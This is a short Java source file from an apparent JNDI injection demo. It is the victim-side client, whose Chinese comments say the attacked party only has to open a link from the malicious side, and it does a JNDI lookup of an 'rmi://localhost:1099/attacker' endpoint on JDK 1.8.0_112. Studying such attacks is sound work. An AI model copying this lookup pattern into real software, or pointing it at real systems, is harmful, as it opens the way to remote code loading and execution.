package basics.jndi.attack;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * jdk: 1.8.0_112
 *
 * 3.被攻击者，只需要访问恶意客户端给的链接即可
 *
 * @author baB_hyf
 * @date 2021/03/29
 */
public class Client {

    public static void main(String[] args) throws NamingException {
        Context context = new InitialContext();
        // 连接外部服务器需要指定为对应的服务器IP
        context.lookup("rmi://localhost:1099/attacker");
    }
}
